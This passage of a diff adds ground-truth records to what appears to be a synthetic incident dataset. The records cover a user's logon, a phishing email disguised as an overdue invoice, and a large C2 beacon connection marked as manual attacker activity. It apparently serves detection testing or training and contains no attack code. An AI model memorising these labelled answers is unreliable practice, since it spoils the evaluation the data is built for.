+      }
+    },
+    {
+      "record_id": "evt-logon-000#0",
+      "kind": "logon",
+      "intent_id": "1787f8dd-e839-4828-86e7-1f84eb87f90a",
+      "storyline_id": "evt-logon-000",
+      "time": "2024-11-04T14:59:32Z",
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "James logs into his own workstation for the day, as usual",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "logon_id": "0xa2616c2",
+        "source_ip": "23.129.64.210"
+      }
+    },
+    {
+      "record_id": "evt-manualcmd-005#0",
+      "kind": "connection",
+      "intent_id": "7c5f3c84-5d81-4a06-95f4-ecf82ae4f6fb",
+      "storyline_id": "evt-manualcmd-005",
+      "time": "2024-11-04T16:43:45Z",
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "Roughly ninety minutes into the beacon, one connection within the same channel carries far more data than any routine check-in — a manual attacker action riding the C2 channel",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "45.83.221.40",
+        "dst_port": 443,
+        "uid": "C192mUjU7C5Jzirkp"
+      }
+    },
+    {
+      "record_id": "evt-phish-001#0",
+      "kind": "email_message",
+      "intent_id": "aac26e69-c442-4425-92cf-d8b0f25b16fe",
+      "storyline_id": "evt-phish-001",
+      "time": "2024-11-04T15:04:48Z",
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "A phishing email disguised as an overdue-invoice notice is delivered to James's inbox",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "evt-phish-001-00003e586dc4",
+        "artifact_path": "artifacts/email/evt-phish-001-00003e586dc4.eml",
+        "message_id": "<billing-d6044188-3859950@invoice-secure-delivery.net>",
+        "outcome": "delivered",
+        "recipients": [
+          "james.okafor@rivermarklegal.com"
+        ],
+        "sender": "billing@invoice-secure-delivery.net",
+        "smtp_uids": [
+          "ClZ5qGj89nSxslVGr"
+        ],
+        "subject": "Overdue Invoice #4471 - Immediate Action Required",
+        "route": [
+          {
+            "src": "aspmx.l.google.com",
+            "dst": "MAIL-01",
+            "src_fqdn": "aspmx.l.google.com",
+            "dst_fqdn": "mail.rivermarklegal.com",
+            "port": "25",
+            "tls": "false",
+            "routing_mode": "inbound",
+            "recipient_domains": "rivermarklegal.com",
+            "uid": "ClZ5qGj89nSxslVGr"
+          }
+        ]
+      }
+    }
+  ]
+}
